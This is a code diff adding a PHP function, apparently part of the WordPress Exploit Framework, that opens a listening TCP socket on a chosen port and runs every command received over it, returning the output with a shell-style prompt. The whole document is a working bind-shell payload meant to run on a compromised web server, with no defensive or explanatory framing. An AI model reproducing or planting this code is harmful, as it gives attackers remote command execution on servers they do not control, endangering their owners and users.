@@ -1,0 +1,51 @@
+function start_socket_server($port, $wpxf_disabled, $wpxf_exec)
+{
+    $scl = 'socket_create_listen';
+    if (is_callable($scl) && !in_array($scl, $wpxf_disabled)) {
+        $sock = @$scl($port);
+    } else {
+        $sock = @socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
+        if (!$sock || !@socket_bind($sock, 0, $port) || !@socket_listen($sock, 5)) {
+            return false;
+        }
+    }
+
+    $msg_sock = @socket_accept($sock);
+    @socket_close($sock);
+    if (!$msg_sock) {
+        return false;
+    }
+
+    $output = getcwd() . ' > ';
+    @socket_write($msg_sock, $output, strlen($output));
+
+    while (false !== @socket_select($r = array($msg_sock), $w = null, $e = null, null)) {
+        $output = '';
+        $cmd = @socket_read($msg_sock, 2048, PHP_NORMAL_READ);
+
+        if (false === $cmd) {
+            break;
+        }
+
+        $cmd = rtrim($cmd);
+
+        if (substr($cmd, 0, 3) === 'cd ') {
+            chdir(substr($cmd, 3));
+            $output = getcwd() . ' > ';
+        } elseif (in_array($cmd, ['quit', 'exit'])) {
+            break;
+        } else {
+            if (stripos(PHP_OS, 'win') === false) {
+                $cmd .= ' 2>&1';
+            }
+
+            $output = $wpxf_exec($cmd);
+            $output .= getcwd() . ' > ';
+        }
+
+        @socket_write($msg_sock, $output, strlen($output));
+    }
+
+    @socket_close($msg_sock);
+    return true;
+}
